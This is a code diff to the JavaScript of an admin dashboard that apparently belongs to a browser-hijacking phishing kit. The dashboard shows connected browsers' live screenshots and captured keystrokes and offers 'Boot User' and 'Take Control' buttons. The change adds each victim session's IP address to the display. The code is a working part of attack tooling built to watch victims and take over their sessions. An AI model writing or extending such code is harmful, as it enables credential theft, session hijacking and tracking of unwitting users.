@@ -61,14 +61,14 @@ let viewport_height = height()
 let activeBrowserId = null
 socket.emit('new_admin', viewport_width, viewport_height)
 
-socket.on("thumbnail", function(browser_id, thumbnail_blob, keydebug){
+socket.on("thumbnail", function(browser_id, thumbnail_blob, keydebug, session_ip){
   if($("#row_" + browser_id)[0] == undefined){
     $('#browsers').append($(` \
     <div class="col-3 border border-dark p-2" style="--bs-border-opacity: .5;width:auto;" id="row_${browser_id}"> \
       <div class="card" style="width:300px;background-color: transparent !important;"> \
         <img id="video_${browser_id}" class="thumbnail w-100 border-bottom" style="height:25vh;" src="" /> \
         <div class="card-body"> \
-          <p class="card-text" id="info_${browser_id}" class="info">Browser ID: ${browser_id}</p>\
+          <p class="card-text" id="info_${browser_id}" class="info">Browser ID: ${browser_id}<br>Session IP: <span id="session_ip_${browser_id}">${session_ip || 'N/A'}</span></p>\
           <div class="btn-group">\
             <button type="button" id="bootuser_${browser_id}" class="btn btn-outline-warning bootuser"><i class="fa-brands fa-jedi-order" style="color: crimson;"></i><em> Boot User </em></button>\
             <button type="button" id="takeoverdebugging_${browser_id}" class="btn btn-outline-warning takeoverdebugging"><i class="fas fa-sack-dollar" style="color: green;"></i><em> Take Control</em></button>\
@@ -95,6 +95,10 @@ socket.on("thumbnail", function(browser_id, thumbnail_blob, keydebug){
   }
   $("#video_" + browser_id)[0].src = thumbnail_blob
   $("#keydebug_" + browser_id)[0].innerText = keydebug
+  const sessionIpNode = $("#session_ip_" + browser_id)[0]
+  if (sessionIpNode) {
+    sessionIpNode.innerText = session_ip || 'N/A'
+  }
 })
 
 socket.on("keydebug", function(browser_id, keydata){
